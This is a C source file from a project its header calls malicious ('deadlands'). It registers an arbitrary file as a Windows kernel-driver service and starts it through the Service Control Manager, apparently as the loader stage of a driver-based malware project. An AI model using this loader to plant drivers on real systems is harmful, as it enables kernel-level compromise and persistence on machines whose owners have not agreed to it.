/*
** Malicious code - project: deadlands
** Filename: InstallService.c
*/

#include <windows.h>
#include <stdio.h>
#include "service.h"

int					InstallService(char **args)
{
    SC_HANDLE       hSCManager;
	HANDLE			hService;
    SERVICE_STATUS	status;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager)
	{
		printf("[ERROR]: Can't open SCManager (%d)\r\n", GetLastError());
		return (-1);
	}

	hService = CreateService(hSCManager, args[0], args[0],
							SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
							SERVICE_ERROR_NORMAL, args[1], NULL, NULL, NULL, NULL, NULL);
	if (GetLastError() == 1073)
	   hService = OpenService(hSCManager, args[0], SERVICE_START | DELETE | SERVICE_STOP);

	 if (!hService)
	 {
		 fprintf(stderr, "[ERROR]: Can't create or open service (%d)\r\n", GetLastError());
		 return (-1);
	 }
	 if (!StartService(hService, 0, NULL))
	 {
		 fprintf(stderr, "[ERROR]: Can't start service (%d)\r\n", GetLastError());
		 CloseServiceHandle(hService);
		 return (-1);
	 }
	CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
	return (0);
}

